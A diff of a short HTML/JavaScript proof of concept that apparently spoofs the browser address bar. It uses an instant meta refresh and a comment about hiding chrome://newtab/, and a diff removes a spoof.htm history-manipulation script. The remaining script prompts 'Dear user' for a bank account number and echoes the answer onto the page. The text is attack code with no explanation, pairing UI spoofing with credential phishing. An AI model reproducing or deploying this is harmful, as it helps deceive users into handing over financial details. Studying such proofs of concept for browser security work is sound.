@@ -1,7 +1,5 @@
 <META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
-<iframe src="spoof.htm"></iframe>
-index.htm
-====================
+<iframe src="code1.html"></iframe>
 <script>
 setTimeout('sleep()',500);
 alert(2); //alert twice
@@ -11,12 +9,4 @@ document.write("123<br>");
 var mes = prompt('Dear user:\nI need your Bank account number','');
 document.write(mes+"<br>");
 }
-</script>
-
-spoof.htm
-===========
-<script>
-document.documentURI=eval();
-history.back(null)
-//debug alert(1)
 </script>
